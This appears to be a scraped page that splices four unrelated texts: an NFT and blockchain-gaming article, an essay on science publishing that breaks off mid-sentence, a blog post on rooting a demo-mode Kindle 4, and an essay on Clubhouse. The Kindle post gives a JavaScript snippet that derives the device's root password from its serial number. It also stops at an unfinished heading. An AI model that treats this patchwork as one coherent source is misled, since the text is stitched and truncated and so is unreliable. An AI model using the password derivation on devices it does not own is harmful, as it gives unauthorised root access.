<p><a href="https://async.art/">Async Art</a> is a digital art marketplace known for programmable art. Many artists on Async sell artwork where someone is able to own the “master” copy which consists of a number of individual layers, but other people can own the individual layers and adjust their attributes over time. Imagine groups of people being able to own art collectively, where members of the group manage attributes of the work.</p>
<figure><p><img src="https://images.mirror-media.xyz/publication-images/fea07c75-8b3c-4592-b8f2-f5d6d92e544c.jpeg" alt="Osinachi artwork that includes a master and layers that can be individually adjusted"></p><figcaption>Osinachi artwork that includes a master and layers that can be individually adjusted</figcaption></figure>
<p>A common question about digital artwork is what can you do with it? These works can be displayed in digital frames in a physical setting for people to enjoy. The digital artist Beeple sold physical tokens along with his digital NFTs and made <a href="https://niftygateway.com/itemdetail/primary/0x6e5dc5405baefb8c0166bcc78d2692777f2cbffb/21">$3.5 million</a> from sales in an auction on the Nifty Gateway marketplace.</p>
<figure><p><img src="https://images.mirror-media.xyz/publication-images/8689be31-b33f-46ac-94aa-feea3a1b3dd1.jpeg" alt="Artist Beeple’s physical token that came with the NFT sale"></p><figcaption>Artist Beeple’s physical token that came with the NFT sale</figcaption></figure>
<p>Digital artwork can also be displayed in online collections like a <a href="https://superrare.co/thevault/collection">SuperRare profile</a> as well as in virtual worlds. There are a number of art galleries within <a href="http://cryptovoxels.com/">Cryptovoxels</a>, a virtual world where users can buy and sell land parcels as NFTs. As virtual reality spaces become more popular, having digital art to display will become more common. This wouldn’t be much different than someone spending money on video game items to customize a character’s appearance, already a multi-billion dollar industry.</p>
<figure><p><img src="https://images.mirror-media.xyz/publication-images/7386d358-d43d-4934-9ea5-b51c33932365.jpeg" alt="Digital art gallery in Cryptovoxels"></p><figcaption>Digital art gallery in Cryptovoxels</figcaption></figure>
<p>A common skepticism is that someone can just take a screenshot of the image or get a digital file so it’s not really scarce. However, the same argument could apply to physical items as well. Anyone can take a photo of the Mona Lisa or create a replica of it, but it isn’t the real item from the artist. People are willing to pay a premium for the original work. Another interesting aspect of digital art or collectibles is that you can easily verify the item’s ownership history. Some digital items might be worth more depending on who owned it in the past.</p>
<p>With NFTs, you can also prove that the item is real and tamper proof. This is an issue in the physical collectibles space. For example, a <a href="https://en.wikipedia.org/wiki/T206_Honus_Wagner">T206 Honus Wagner baseball card</a> was sold to Wayne Gretzky for $451k and sold again for several million dollars. One of the sellers of the card later admitted in court to trimming the card’s edges to make it look better. You can ensure NFT supply doesn’t change and there’s no counterfeit or continued printing. For example, there are many <a href="https://www.youtube.com/watch?v=AAvLC3fz068&amp;">counterfeit Black Lotus</a> cards in the popular game Magic: The Gathering. Common verification methods include bending the card to make sure it doesn’t crease or going through centralized grading services whose rating significantly affects the card's value.</p>
<h3>Gaming</h3>
<p>Steam, a popular video game platform, has a <a href="https://steamcommunity.com/market/?">Community Market</a> where in-game items can be bought and sold. Steam’s marketplace is centralized and collects a transaction fee of 5% for each item from the buyer. Games like Team Fortress 2 and Dota 2 take an additional fee of 10% for their items sold.</p>
<figure><p><img src="https://images.mirror-media.xyz/publication-images/4ad85fcf-b986-4b60-9fb5-925200fde3a9.jpeg" alt="Steam Community Market"></p><figcaption>Steam Community Market</figcaption></figure>
<p>Steam also restricts user wallet balances to $2,000 and the price of a single item to $1,800. While these cases are outliers, many in-game items can actually sell for significantly larger amounts such as the <a href="https://www.engadget.com/2013-11-06-dota-2-pink-war-dog-courier-sells-for-38-000.html">DotA 2 pink war dog courier</a> for $38,000. Within the crypto space there have also been high priced sales such as the $170,000 <a href="https://thenextweb.com/hardfork/2018/09/05/most-expensive-cryptokitty/">CryptoKitty</a>. Similarly Magic: The Gathering’s coveted <a href="https://www.polygon.com/2019/3/5/18251623/magic-the-gathering-black-lotus-auction-price">Black Lotus</a> card sold for $166,100. There is certainly demand for valuable in-game items. In decentralized marketplaces, there isn’t a limit imposed on what game items can be sold and for what amount.</p>
<p>Decentralized marketplaces can significantly reduce transaction fees due to the improved efficiency of starting up and operating a marketplace. Marketplaces can also improve overall user experience and increase interest in the game. Hearthstone is a wildly popular digital collectible card game created by Blizzard Entertainment that had over <a href="https://variety.com/2018/gaming/news/hearthstone-has-over-100-million-players-1203019919/">100 million players</a> in 2018. Hearthstone opted to not have a marketplace for their cards which leaves opportunity for other digital collectible card games that allow for an open marketplace. <a href="https://godsunchained.com/">Gods Unchained</a> and <a href="https://www.skyweaver.net/">SkyWeaver</a> are two trading card games (TCGs) that have cards that are freely tradable. You are also able to earn cards as you level up in the game. Players that did not purchase packs of cards will still be able to improve upon the game’s default decks. It’s an exciting feeling knowing that the earned cards have real world value and can be sold or traded for other cards. Gods Unchained also lets users earn tokens for when they win a match or refer their friend. The tokens themselves unlock rare in-game items and are also freely tradable.</p>
<figure><p><img src="https://images.mirror-media.xyz/publication-images/aa82c586-39b6-46b1-ae55-cb8a2e44c8e1.jpeg" alt="Gods Unchained"></p><figcaption>Gods Unchained</figcaption></figure>
<p>One of the most popular games in crypto is <a href="https://axieinfinity.com/">Axie Infinity</a>. You battle with a team of pet Axies and level them up. There's no aspect of the gameplay that feels like a blockchain game but there is the added benefit of being able to openly trade the Axies on NFT marketplaces such as <a href="https://opensea.io/">OpenSea</a>. The game has become popular in the <a href="https://www.coindesk.com/nft-game-filipinos-covid">Philippines</a> and earning tokens from the game has become a viable source of income for players even <a href="https://www.playtoearn.online/2020/07/08/axie-infinity-beats-minimum-wage-in-many-countries/">beating minimum wage</a> in many countries. There is also a decentralized autonomous organization (DAO) called <a href="https://yieldguild.io/">Yield Guild Games</a> which leases Axies to players that want to get started with the game but don’t have the funds to purchase them. Several rare Axies were even <a href="https://www.delphidigital.io/reports/why-we-spent-159k-on-digital-battle-pets-2/">purchased</a> for $159,000 total.</p>

<p>There’s another popular game <a href="https://zkga.me/">Dark Forest</a> where you can explore different planets and collect Artifact NFTs on new planets, which give bonuses when attached to the planet. Being able to discover and collect these items or even win them in a battle and then trade them in decentralized marketplaces can make the game even more fun.</p>
<figure><p><img src="https://images.mirror-media.xyz/publication-images/be66b61a-05f0-46b7-aa8f-f7ed542d5cd3.jpeg" alt="Planet in Dark Forest which has an Artifact NFT"></p><figcaption>Planet in Dark Forest which has an Artifact NFT</figcaption></figure>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
					<div>
						<p>The 21st century has seen some phenomenal advances in our ability to make scientific discoveries. Scientists have developed <a href="https://www.nature.com/articles/nrd.2017.243">new technology</a> to build vaccines swiftly, <a href="https://deepmind.com/blog/article/alphafold-a-solution-to-a-50-year-old-grand-challenge-in-biology">new algorithms</a> to predict the structure of proteins accurately, <a href="https://www.genome.gov/about-genomics/fact-sheets/DNA-Sequencing-Costs-Data">new equipment</a> to sequence DNA rapidly, and <a href="https://www.vox.com/platform/amp/energy-and-environment/2020/10/21/21515461/renewable-energy-geothermal-egs-ags-supercritical">new engineering solutions</a> to harvest energy efficiently. But in many fields of science, reliable knowledge and progress advance <a href="https://www.theatlantic.com/science/archive/2018/11/diminishing-returns-science/575665/">staggeringly</a> <a href="https://marginalrevolution.com/marginalrevolution/2019/11/is-the-rate-of-scientific-progress-slowing-down.html">slowly</a>. What slows it down? And what can we learn from individual fields of science to pick up the pace across the board – without compromising on quality?</p>
<p>By and large, scientific research is published in journals in the form of papers – static documents that do not update with new data or new methods. Instead of sharing the data and the code that produces their results, most scientists simply publish a textual description of their research in online publications. These publications are usually hidden behind paywalls, making it harder for outsiders to verify their authenticity.</p>
<p>On the occasion when a reader spots a discrepancy in the data or an error in the methods, they must read the intricate details of a study’s method scrupulously, and cross-check the statistics manually. When scientists don’t share the data to produce their results openly, the task becomes even harder. The process of error correction – from scientists publishing a paper, to readers spotting errors, to having the paper corrected or retracted – can take <a href="https://retractionwatch.com/2017/04/26/university-asked-numerous-retractions-eight-months-later-three-journals-done-nothing/">years</a>, assuming those errors are spotted at all.</p>
<p>When scientists reference previous research, they cite entire papers, not specific results or values from them. And although there is <a href="https://mattsclancy.substack.com/p/does-science-self-correct">evidence</a> that scientists hold back from citing papers once they have been retracted, the problem is compounded over time – consider, for example, a researcher who cites a study that itself derives its data or assumptions from prior research that has been disputed, corrected or retracted. The longer it takes to sift through the science, to identify which results are accurate, the longer it takes to gather an understanding of scientific knowledge.</p>
<p>What makes the problem even more challenging is that flaws in a study are not necessarily mathematical errors. In many situations, researchers make fairly arbitrary decisions as to how they collect their data, which methods they apply to analyse them, and which results they report – altogether leaving readers blind to the impact of these decisions on the results.</p>
<p>This murkiness can result in what is known as p-hacking: when researchers selectively apply arbitrary methods in order to achieve a particular result. For example, in a study that compares the well-being of overweight people to that of underweight people, researchers may find that certain cut-offs of weight (or certain subgroups in their sample) provide the result they’re looking for, while others don’t. And they may decide to only publish the particular methods that provided that result.</p>
<p>If a reader can’t find out how different versions of a study method have affected the results, how are they to know whether the finding really was robust – that it would be found regardless of how the data was looked at?</p>
<p>Now, it’s common to assume that these errors and flaws are largely smoothed out during the process of peer review, where peer scientists are asked to scrutinise a study and recommend to journal editors whether it should be revised or even published at all. But unfortunately peer review often fails to accomplish this, as the scientist Stuart Ritchie has described in his book <a href="https://us.macmillan.com/books/9781250222695"><i>Science Fictions</i></a>.</p>
<p>Substandard methods and questionable research practices are widespread even in published work. There is an enormous number of journals available, with different standards of publication, in which scientists can publish their work if they are rejected by some. And many lines of <a href="https://www.frontiersin.org/articles/10.3389/fnhum.2018.00037/full">evidence</a> suggest that ‘high impact’ journals (journals which are said to be highly reputable and have a wide reach) accept papers with similar or weaker methods than low-impact journals do.</p>
<p>Peer review instead functions predominantly as a practice of gatekeeping, as the philosophers of science Liam Bright and Remco Heesen have <a href="https://academic.oup.com/bjps/advance-article/doi/10.1093/bjps/axz029/5526887">explained</a>. Reviewers provide scientists with comments that are rarely made public. Whether research is published in a particular journal largely depends on the idiosyncratic decisions of reviewers who are available at the time and who are liked by the journal’s editors.</p>
<p>Peer review filters which research is published, with no use of transparent metrics for others to understand the reasoning behind these choices. The lack of transparency lends itself to misconduct – reviewers may discourage the publishing of science that challenges the prevailing consensus of the time or fails to replicate it – and hype, encouraging the publication of results that seem exciting over those that provide nuance.</p>
<p>These decisions have consequences, because journals are the dominant platform for sharing scientific research. When non-scientists, who want to apply scientific knowledge elsewhere, read research, they have little way of knowing which methods are sound and which results are reproducible or replicable.	<sup data-close="x" data-content="[1]">[1]</sup>
	<span>Reproducibility relates to whether the results can be reproduced using the same data and code as in the original analysis. Replicability relates to whether other scientists find similar results in their own studies.</span>
	 Other scientists can face the same problems, finding it difficult to assess the state of knowledge in a field, particularly if they have expertise in a different subject. This is troubling: the longer it takes to sift through the research to find out which results are reliable, the longer it takes to apply knowledge to solve new problems.</p>
<p>This view paints a bleak picture of the state of scientific knowledge, and the question that arises is: is all of science like this?</p>
<p>Fortunately, the answer is no. But unfortunately, many good practices are fairly modern and limited to specific domains. Here are some of them.</p>
<p>The remarkable <a href="https://deepmind.com/blog/article/alphafold-a-solution-to-a-50-year-old-grand-challenge-in-biology">breakthrough</a> by DeepMind in 2020 – in accurately predicting the folded structure of proteins using only the code of protein sequences – was made possible because DeepMind’s AlphaFold algorithm was trained using data from <a href="https://www.rcsb.org/pages/about-us/index">Protein Data Bank</a>, a vast public database that dates back to 1971. Molecular scientists have been carefully applying difficult laboratory techniques to establish the structure of proteins and have manually submitted information about them to this database <a href="https://journals.iucr.org/a/issues/2008/01/00/sc5004/">for decades</a>. In parallel, data managers have been reviewing each of their submissions for accuracy. The platform now harbours over 150,000 curated entries of protein structures.</p>
<p>With databases like this, the benefits to other scientists are enormous: specifically, understanding the structure of proteins can help scientists design precise drugs that fit into them, as has been done for the <a href="https://cen.acs.org/analytical-chemistry/structural-biology/structural-biologists-revealed-new-coronaviruss/98/i17">spike protein</a> of the coronavirus. It can also help them understand why resistance to a drug has developed, such as in <a href="https://www.nature.com/scitable/topicpage/the-protein-data-bank-exploring-biomolecular-structure-14199109/">HIV research</a>. But more broadly, individual researchers no longer have to rediscover these protein structures over and over again if they have already been shared publicly, if they want to use that knowledge for other purposes.</p>
<p>The practice of sharing data is also the norm in the neighbouring field of genomics. The tradition largely stems from the <a href="https://en.wikipedia.org/wiki/Human_Genome_Project">Human Genome Project</a>, which began in 1990 and aimed to determine the entire code of the human genome. During the project, a group of scientists developed protocols called the <a href="https://www.annualreviews.org/doi/10.1146/annurev-genom-083115-022515">Bermuda Principles</a>, which recommended that labs working on the project should upload the details of any new genetic sequences that they discovered onto public data repositories on a daily basis.</p>
<p>Though the project was completed in 2003, the movement paved the way for data sharing principles in many genetic projects to come, such as the HapMap project, the 1000 Genomes project, dbGaP, and more recently, GISAID and NextStrain – two databases which publicly share genomes of the SARS-CoV-2 (Covid-19) virus.	<sup data-close="x" data-content="[2]">[2]</sup>
	<span>The HapMap project is a project that maps common genetic mutations of the human genome, while the 1000 Genomes project aims to develop a map of rare genetic mutations. dbGaP is a database of genetic mutations that are associated with medical traits and diseases.</span>
	 As with protein databases, these open sharing practices are remarkably important in genomics, in particular because they allow scientists to investigate a large number of genes and mutations at the same time, each detailed with a large amount of information that other scientists have collected.</p>
<p>These databases are immensely useful in sharing <i>data</i> for other researchers to analyse, but different tools are necessary for researchers to share the code used to <i>analyse data</i> – for example, if they want to test specific hypotheses. Some researchers voluntarily share their analysis code on <a href="https://en.wikipedia.org/wiki/Git">GitHub</a> and <a href="http://osf.io/">OSF</a>, two platforms where people can upload their data, code and research plans and update them when changes are made. But the practice of sharing code is not widely used by scientists even within these fields.</p>
<p>In computer science however, there are examples of journals that work with version control tools like Git. Take <a href="https://peerj.com/articles/cs-147/">JOSS</a> as an illustration, a journal that publishes research describing open source software. JOSS is actually built upon the platform of GitHub: software developers submit their software together with working papers describing them to the journal via GitHub, and the journal’s reviewers provide comments on their code and suggest revisions to their work publicly. Both reviewers’ comments and past versions of the software are therefore transparent and accessible to the public.</p>
<p>Apart from these examples of sharing data and code openly, some fields already commonly try to tackle p-hacking and other questionable research practices, described before. In economics, researchers typically perform “<a href="http://www.nickchk.com/robustness.html">robustness checks</a>” to demonstrate that their …</p></div></div></div>

<p>I fancied getting an eink screen to use for future projects. I bought a wee one with a raspberry pi “hat” attached. However, I realised later that I could maybe just re-purpose an old Amazon Kindle ebook reader.</p>



<p>I’ve messed with Kindles before, ages ago: I ported an <a href="https://blog.lidskialf.net/2010/10/09/kif-an-infocom-text-adventure-interpreter-for-the-kindle/">Infocom interpreter</a> and a <a href="https://blog.lidskialf.net/2010/10/20/mangle-a-better-manga-reader-for-the-kindle/">Manga</a> reader to it. I managed to get Amazon’s own software to load them as “Kindlets” and show them integrated into their ebook reader. However, now I just want a nice cheap Linux based eink development platform.</p>



<p>Cheap Kindle From Ebay (and why)</p>



<p>So, off to ebay I went! I saw a number of really cheap ones marked “BLOCKED BY AMAZON”; I decided not to go for these since theoretically they might have been stolen. In the end, I went for £7 Kindle 4 “non-touch”.</p>



<p>A few days later, it turned up. And I discovered <em>why</em> it might have been so cheap: its stuck in some sort of unquittable demo mode:</p>



<figure><img data-attachment-id="1725" data-permalink="https://blog.lidskialf.net/kindle_demo_mode/" data-orig-file="https://adq454703481.files.wordpress.com/2021/02/kindle_demo_mode.jpg" data-orig-size="892,1239" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="kindle_demo_mode" data-image-description="" data-medium-file="https://adq454703481.files.wordpress.com/2021/02/kindle_demo_mode.jpg?w=216" data-large-file="https://adq454703481.files.wordpress.com/2021/02/kindle_demo_mode.jpg?w=737" src="https://adq454703481.files.wordpress.com/2021/02/kindle_demo_mode.jpg?w=737" alt="" srcset="https://adq454703481.files.wordpress.com/2021/02/kindle_demo_mode.jpg?w=737 737w, https://adq454703481.files.wordpress.com/2021/02/kindle_demo_mode.jpg?w=108 108w, https://adq454703481.files.wordpress.com/2021/02/kindle_demo_mode.jpg?w=216 216w, https://adq454703481.files.wordpress.com/2021/02/kindle_demo_mode.jpg?w=768 768w, https://adq454703481.files.wordpress.com/2021/02/kindle_demo_mode.jpg 892w" sizes="(max-width: 737px) 100vw, 737px"></figure>



<p>I did some googling and although it seems later Kindle versions can be un-demo-mode-ed, nothing seemed to work for this version. I don’t actually care though; I don’t want to run the original Kindle ebook software on this.</p>



<p>So, the next step is to gain access. Browsing the <a href="https://www.mobileread.com/forums/showthread.php?t=166687">mobileread forums</a> showed it has a debug serial port: time to open the case!</p>



<p>Physical Access Granted!</p>



<p>This was kinda tricky! There are multiple clips all round it and the case is glued onto the battery compartment, so judicious application of a Big Knife was required to persuade it to let go. I cleaned the glue up with some Acetone.</p>

<ul><li>Red: annoying clips</li><li>Purple: <strong>really</strong> annoying glue.</li><li>Yellow: the serial port!</li></ul>



<p>As usual for this sort of thing, the serial port is missing its socket, so we need to solder onto the tiny contacts on the board. I like to use ~0.2mm wirewrap wire for this sort of thing, and the surface mount rework bit for my soldering iron:</p>







<p>I don’t want to leave any wires flapping about, but I also know at some point I’m going to screw up and need serial port console access, so I came up with a solution and attached it:</p>







<p>I superglued a piece of Veroboard onto the kindle’s PCB, then soldered wirewrap wires from the tiny PCB contacts onto one end. Finally, I soldered a larger, more conventional “Dupont” cable socket on the other end so I could easily attach and detach from it. Oh, the top cable on the Kindle PCB is 0v/GND, the others are TX and RX (I forget the order of those two).</p>



<p>Final hurdle: the kindle serial port runs at 1.8v, so I needed a serial port adaptor which supports that:</p>



<figure><img data-attachment-id="1737" data-permalink="https://blog.lidskialf.net/kindle_usbserial/" data-orig-file="https://adq454703481.files.wordpress.com/2021/02/kindle_usbserial.jpg" data-orig-size="545,828" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="kindle_usbserial" data-image-description="" data-medium-file="https://adq454703481.files.wordpress.com/2021/02/kindle_usbserial.jpg?w=197" data-large-file="https://adq454703481.files.wordpress.com/2021/02/kindle_usbserial.jpg?w=545" src="https://adq454703481.files.wordpress.com/2021/02/kindle_usbserial.jpg?w=545" alt="" srcset="https://adq454703481.files.wordpress.com/2021/02/kindle_usbserial.jpg 545w, https://adq454703481.files.wordpress.com/2021/02/kindle_usbserial.jpg?w=99 99w, https://adq454703481.files.wordpress.com/2021/02/kindle_usbserial.jpg?w=197 197w" sizes="(max-width: 545px) 100vw, 545px"></figure>



<p>The one I bought does 5v. 3.3v, 2.5v, and 1.8v: it’s pretty neat!</p>



<p>Root Access Granted!</p>



<p>Next, I attached the serial adapter to my laptop, ran the <strong>minicom</strong> serial port software and rebooted the Kindle. Then, once I (inevitably) swapped the TX and RX wires around, I was greeted by this!</p>

Welcome to Kindle!

kindle login: </code></pre>



<p>Great, so that’s booting the uboot bootloader, then booting into linux and asking me to login.</p>



<p>Trying to login as root prompts for a password: Hmm… However, I already knew from previous Kindle stuff that you can generate the password from the serial number. I found <a href="https://www.sven.de/kindle/">this website</a> which generates a number of possible passwords for a specific device: Mine was the third on the list.</p>



<p>In case that site dies here’s the key snippet of Javascript:</p>



<pre><code>var md5 = hex_md5(serial);
document.getElementById("rootpw").innerHTML = "fiona" + md5.substring(7,11);
document.getElementById("rootpw2").innerHTML = "fiona" + md5.substring(7,10);
document.getElementById("rootpw3").innerHTML = "fiona" + md5.substr(13,3);</code></pre>



<p>Oh: I forgot to mention how I extracted the device’s serial number. Well, plugging it into USB doesn’t really “work”: you can’t mount these demo devices as disks. But, under linux, it still outputs the serial number in linux’s <strong>dmesg</strong> output (you can also get it using <strong>printenv</strong> in uboot if you press enter when it says “Hit any key to stop autoboot”):</p>



<pre><code>[128033.676587] usb 1-2: new high-speed USB device number 51 using xhci_hcd
[128033.829631] usb 1-2: New USB device found, idVendor=1949, idProduct=0004, bcdDevice= 1.00

</code></pre>



<p>Cool! We have root and can login! Now to figure out how to make it a bit easier to do stuff on it.</p>



<p>Dumping The System</p>



<p>First step is usually to dump the disks for analysis on another computer.</p>



<p>Checking <code>/proc/mounts</code> shows multiple partitions of the main disk on <code>/dev/mmcblk0</code>.</p>



<p>Running <code>fdisk /dev/mmcblk0</code> gives the following:</p>



<pre><code>Units = cylinders of 64 * 512 = 32768 bytes

        Device Boot      Start         End      Blocks  Id System
/dev/mmcblk0p1   *        1025       12224      358400  83 Linux
/dev/mmcblk0p2           12225       14272       65536  83 Linux
/dev/mmcblk0p3           14273       15296       32768  83 Linux
/dev/mmcblk0p4           15297       59776     1423360   b Win95 FAT32</code></pre>



<ul><li>So, four partitions, three linux, and one FAT32. </li><li>The first disk starts quite far into the disk: turns out the kernel is stored in that “missing” area. </li><li>Poking about a bit more shows partition 1 is the normal system, 2 is a sort of diagnostic tool partition, 3 is for storing internal private state of the kindle (eg wifi passwords). Finally, 4 is the one you see when you plug a kindle in over USB: its where your books would reside.</li><li>Partition 4 is mounted at /mnt/us.</li></ul>



<p>I dumped the start of the disk and partitions 1-3 onto /mnt/us using dd (I like to take a complete raw image if I can so I can restore it in case something goes wrong):</p>



<pre><code>dd if=/dev/mmcblk0 of=/mnt/us/kindle.img bs=32768 count=15297</code></pre>



<p>Although this Kindle doesn’t show a disk over USB, since I have root, I can simply make it do it:</p>



<pre><code>rmmod g_file_storage
modprobe g_file_storage file=/dev/mmcblk0p4</code></pre>



<p>It popped up on my laptop so I copied everything off.</p>



<p>System Analysis</p>



<p>Finally, I mounted the partitions in kindle.img on my laptop with:</p>



<pre><code>kpartx -v kindle.img</code></pre>



<p>I could then mount the individual partitions on my laptop. I extracted all the files into a folder so I could poke around them and grep them easily. I figured out:</p>



<ul><li>It uses <code>rc.d</code> as its system init system, so there are lots of nice plain text scripts.</li><li>Init level 5 is the “normal” system running the ebook software</li><li>The ebook software is in <code>/opt/amazon</code> and is in Java (I kinda already knew this, but needed a quick refresher).</li><li>There’s a whole load of interesting plain text “diag” scripts for testing.</li><li>There’s a rather nifty <code>wifid</code> daemon for managing the wifi connection: I figured out how to talk to this from the diag scripts.</li><li>You can write to the eink screen from the command line using the <code>/usr/sbin/eips</code> command (<a href="https://wiki.mobileread.com/wiki/Eips">docs here</a>).</li><li>I couldn’t find an obvious “turn off demo mode” switch: it appears the demo mode is a customised build of the Java ebook software.</li><li>The following system services are to do with unsupported features, the ebook software, or talking back to amazon: <code>S50wan S70wand S75phd S81usbnetd S93webreaderd S94browserd S95framework S96boot_finished</code>.</li></ul>



<p>Talking To Wifid</p>



<p>You can use the built in wifid to connect to wifi and manage your wifi profiles. Oh, also, remember many Kindles only support 2.4Ghz wifi when you wonder why it isn’t working 😉</p>



<p><strong>List number of WIFI profiles:</strong></p>



<p><code>lipc-get-prop com.lab126.wifid profileCount</code></p>



<p><strong>Show contents of a WIFI profile:</strong></p>



<p><code>echo "{index=(0)}" | lipc-hash-prop com.lab126.wifid profileData</code></p>



<p><strong>Delete a WIFI profile:</strong></p>



<p><code>lipc-set-prop com.lab126.wifid deleteProfile WIFIESSID</code></p>



<p><strong>Create a WIFI profile:</strong></p>



<p><code>echo '{essid="WIFIESSID", smethod="wpa2", secured="yes", psk="WIFIPSK"}' | lipc-hash-prop com.lab126.wifid createProfile</code></p>



<p>smethod can be one of open,wep,wpa,wpa2 (if you choose open, set secured to “no”)</p>



<p>WIFIPSK is the WIFI PSK as generated with the <code>wpa_passphrase</code> utility (which is actually on the kindle): a normal “wifi passphrase” will not work.</p>



<p><strong>Connect a WIFI profile:</strong></p>



<p><code>lipc-set-prop com.lab126.wifid cmConnect WIFIESSID</code></p>



<p><strong>Show WIFI connection status:</strong></p>



<p><code>echo "{index = (0)}" | lipc-hash-prop -n com.lab126.wifid currentEssid</code></p>



<p>Making Changes To Root</p>



<p>Many of the following instructions need to change the root disk on the kindle. However, by default it is mounted in read only mode, preventing modification. To fix, run this command on the kindle:</p>



<pre><code>mntroot rw</code></pre>



<p>When done, set it back to read only mode to prevent any unwanted changes:</p>



<pre><code>mntroot ro</code></pre>



<p>Installing Dropbear SSH</p>

<p><em>You can listen to <a href="https://share.transistor.fm/s/6719542d">an audio version of this essay here</a>.</em></p>
<p>Trust me, I <em>tried</em> to make the Clubhouse bear case.</p>
<p>The original title of this post was "Everything Clubhouse Did Right — and Why It Will Fail Anyway". The exercise forced me to list the reasons why it wasn't worth $1 billion - why live conference calls are inferior to existing formats like podcasts and Discord.</p>
<p>When I was done, I went for a walk to think about it. By the time I came back, I had done a complete 180. (Note - <em>this was even before I heard about the Elon event</em>)</p>
<p>I <em>still</em> dislike the Clubhouse experience. I wouldn't recommend it to you. But all the reasons I dislike it are the same reasons it will work:</p>
<ul>
  <li><strong>Clubhouse is exclusive</strong>. You have hoops to jump and gates to open every step of the way. It's iOS only. Invite only. Requires your phone number for no goddamn reason. And once you're through <em>all of that</em> you gain the privilege of being in the voiceless audience hoping senpai will notice your raised hand and puffed up bio.</li>
  <li><strong>Clubhouse is ephemeral</strong>. Conversations aren't recorded. Your work doesn't compound and isn't searchable. This is <em>horrible</em> for ROI on your time as a content creator.</li>
  <li><strong>Clubhouse is live-only</strong>. If all the convos are happening in Pacific Time and you live in Europe, tough luck. If you came in halfway and have no idea what was said, tough luck. The only way to be fully involved is to turn on mobile notifications and track scheduled chats. Causing more — not less — distraction and work for you.</li>
  <li><strong>Clubhouse enhances existing privilege</strong>. Because automated recommendations aren't possible, Clubhouse mostly relies on a Twitter-like follow graph. To gain a following you mostly already have to be famous off-platform or well-connected to people who will bring you up on stage ("second-degree famous"). Choosing a <a href="https://www.eugenewei.com/blog/2019/2/19/status-as-a-service">Status as a Service</a> model (Twitter) over a <a href="https://www.eugenewei.com/blog/2020/8/3/tiktok-and-the-sorting-hat">Sorting Hat</a> model (TikTok) sacrifices discovery for establishment.</li>
  <li><strong>Clubhouse is a terrible listening experience</strong>. There's no audience chat or polling. Obnoxious speakers can dominate the conversation. <a href="https://twitter.com/wongmjane/status/1355817942093496320?s=20">Trolls</a> and <a href="https://www.dailydot.com/unclick/tiffany-haddish-bullies-doctor-on-clubhouse-covid/">harassment</a> abound. You can't play at 2x or rewind an important part. Podcasts were trending towards better audio and editing, Clubhouse regresses to shitty phone mics with feedback and connection issues. Signal is scarce, noise is rampant.</li>
</ul>
<p>In my original write up I listed the many better offerings in every dimension. Want to listen to interviews with great audio and show notes? Podcasts. Want ultrascalable livestreaming? Twitch. Want livestreamed audio with recording and submitted questions? <a href="https://twitter.com/N8Elliott/status/1355203379392176131?s=20">Capiche</a>. Want to do an audio webinar? Use Zoom with the camera off. Want voice with text chat? Discord. Just want a Clubhouse clone with less friction? <a href="https://twitter.com/TwitterSpaces">Twitter Spaces</a>.</p>
<p>When I was done listing the alternatives, I knew I had made a mistake. They checked more boxes on a feature comparison basis. But social media doesn't work like that. I was trying to be logical in a <em>socio</em>-logical domain.</p>
<p>I had conclusively <em>PROVED</em>, with my big brain and fancy words, how profoundly inferior Clubhouse was. No compounding creator should prefer it, and no self respecting listener should enjoy it, compared to alternatives.</p>
<p>But the majority of people don't work like that:</p>
<ul>
  <li>Some people are turned off by exclusivity and friction. But <em>most people</em> take it as social proof of something cool.</li>
  <li>Some creators are turned off by ephemerality. But <em>more people</em> will start trying precisely because it's easy and doesn't matter. The Elon Musks and Vlad Tenevs of the world will be less guarded, despite clearly knowing anything they say will be recorded, because <em><a href="https://en.wikipedia.org/wiki/The_medium_is_the_message">the medium is the message</a></em>.</li>
  <li>Some people are turned off by demands on their time. But <em>most people</em> leave mobile notifications on and the live nature of chats creates some of the most urgent notifications you'll get on your phone, second only to a call from your mother. The synchronicity creates an <em>event</em> — a clear Before and After where you can excitedly gossip and feel superior to people out of the loop. This is a rarity in an everything-async world.</li>
  <li>Some people are turned off by stacked decks. But <em>most people</em> just want to follow celebrities and experts and aren't interested in the challenging, messy work of finding people on the way up.</li>
  <li>Some people are turned off by the listening experience. But Clubhouse is <a href="https://www.swyx.io/good-enough/">Good Enough</a>, especially if content is created sooner and in bigger quantity than available anywhere else.</li>
</ul>
<p>Clubhouse should've died <a href="https://www.theverge.com/interface/2020/7/8/21316172/clubhouse-content-moderation-taylor-lorenz-harassment-abuse">in July when the VC and Media abuse cases erupted</a>. Instead it came back stronger than ever, standing at <a href="https://web.archive.org/web/20210131175202/https://www.businessinsider.com/why-the-hype-about-1-billion-clubhouse-not-so-crazy-2021-1">2 million weekly active users</a>. <strong>If any of these negatives mattered</strong>, the app should have seen extreme churn. Instead, <a href="https://a16z.com/2021/01/24/investing-in-clubhouse/">Andrew Chen</a>, <a href="https://twitter.com/rrhoover/status/1353393250552270850">Ryan Hoover</a>, and <a href="https://www.indiehackers.com/post/gumroad-is-switching-from-zoom-to-clubhouse-34e4b4e5e1">Sahil Lavingia</a> — who do this for a living and have insider knowledge of metrics — value it above $1 billion dollars, six months after it was <a href="https://www.forbes.com/sites/alexkonrad/2020/05/15/andreessen-horowitz-wins-vc-sweepstakes-to-back-clubhouse-voice-app/?sh=5b8466d56f2a">valued at $100 million</a>.</p>
